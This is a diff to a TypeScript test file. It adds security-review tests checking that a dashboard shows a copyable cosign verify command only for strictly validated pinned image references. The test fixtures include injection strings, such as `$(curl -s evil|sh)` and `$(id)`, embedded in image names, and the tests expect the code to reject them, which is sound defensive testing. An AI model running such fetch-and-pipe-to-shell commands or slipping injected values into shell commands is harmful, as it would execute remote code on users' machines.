@@ -5,7 +5,8 @@ import { ApiClient } from "../../src/lib/api";
 import { type CommandOutcome, type Posture, type StreamEvent, parseBuildInfo, parsePosture, parseProvenance, parseRunList, parseStats, parseTick, toStreamEvent } from "../../src/lib/contract";
 import { utc, utcClock, when } from "../../src/lib/dom";
 import { posture, stats, TERMINAL_OBJECTIVES } from "../../src/lib/fixtures";
-import { COSIGN_IDENTITY_REGEXP, COSIGN_ISSUER, ciRunUrl, commitUrl, cosignVerifyCommand, rekorSearchUrl } from "../../src/lib/provenance";
+import { COSIGN_IDENTITY_REGEXP, COSIGN_ISSUER, ciRunUrl, commitUrl, cosignVerifyCommand, isPinnedImageRef, rekorSearchUrl } from "../../src/lib/provenance";
+import { mountConsole } from "../../src/ui/console";
 import { buildTimeline, noDetection } from "../../src/lib/timeline";
 import { renderEvidenceCard, renderEvidenceDetail, renderNoAttack, renderTicker, tickerItems } from "../../src/ui/evidence";
 import { admissionTone, renderPostureData } from "../../src/ui/posture";
@@ -335,5 +336,56 @@ describe("ApiClient reads the new endpoints, and /build.json outside /api", () =
     await api.buildInfo();
     await api.provenance();
     expect(asked).toEqual(["/build.json", "/api/provenance"]);
+  });
+});
+
+const HEX = "0123456789abcdef".repeat(4);
+const EVIL = `$(curl -s evil|sh)x@sha256:${HEX}`;
+const GOOD = `ghcr.io/hubertmj/self-defending-portfolio/scenario@sha256:${HEX}`;
+
+describe("a copied cosign command names only a strictly validated pinned image (security review, LOW)", () => {
+  it("isPinnedImageRef accepts registry[:port]/path@sha256 and nothing else; the builder throws", () => {
+    expect(isPinnedImageRef(GOOD)).toBe(true);
+    expect(isPinnedImageRef(`registry.local:5000/a/b-c@sha256:${HEX}`)).toBe(true);
+    for (const bad of [EVIL, `$(id) ghcr.io/x/y@sha256:${HEX}`, `ghcr.io/x/y:tag`, `ghcr.io/X/y@sha256:${HEX}`, `ghcr.io/x/y@sha256:${HEX} --insecure`, `ghcr.io/x/y@sha256:${HEX}\n`, `y@sha256:${HEX}`, `${"a/".repeat(150)}b@sha256:${HEX}`]) {
+      expect(isPinnedImageRef(bad), bad).toBe(false);
+    }
+    expect(() => cosignVerifyCommand(EVIL)).toThrow();
+  });
+
+  const runWithImage = (image: string) =>
+    buildTimeline(
+      [
+        ev("run", { run_id: "0f0e0d0c0b0a0908", scenario: "shell-in-container", state: "started", at: at(0), pod: POD }, 1),
+        ev("pod", { run_id: "0f0e0d0c0b0a0908", pod: POD, uid: "u", phase: "Running", reason: "", container_id: "9b2e7c4d1a0f", image, labels_delta: {}, deleted: false, at: at(10) }, 2),
+        ev("run", { run_id: "0f0e0d0c0b0a0908", scenario: "shell-in-container", state: "finished", at: at(3000) }, 3),
+      ],
+      T + 4000,
+    );
+
+  it("the evidence record: no command and no copy button for a forged image", () => {
+    const ok = renderEvidenceDetail(runWithImage(GOOD).runs[0], { title: "x", now: T + 4000 });
+    expect(ok.querySelectorAll(".cmd .copy")).toHaveLength(1);
+    const evil = renderEvidenceDetail(runWithImage(EVIL).runs[0], { title: "x", now: T + 4000 });
+    expect(evil.querySelector(".cmd")).toBeNull();
+    expect(evil.querySelector(".copy")).toBeNull();
+  });
+
+  it("the live run console: no command and no copy button for a forged image", () => {
+    const api = new ApiClient({ fetch: async () => new Response("{}", { status: 404, headers: { "Content-Type": "application/json" } }) });
+    const cmds = (image: string) => {
+      const root = document.createElement("section");
+      document.body.append(root);
+      mountConsole(root, api).update(runWithImage(image));
+      return root.querySelectorAll(".verify .cmd");
+    };
+    expect(cmds(GOOD)).toHaveLength(1);
+    expect(cmds(EVIL)).toHaveLength(0);
+  });
+
+  it("the verify strip and panel: no Copy cosign for a forged image", () => {
+    const d = { provenance: { api: { commit: "", ci_run_id: "", images: [EVIL] }, web: { images: [] } }, build: null };
+    expect(renderStrip(d).textContent).not.toContain("Copy cosign");
+    expect(renderVerifyPanel(d).querySelector(".cmd")).toBeNull();
   });
 });
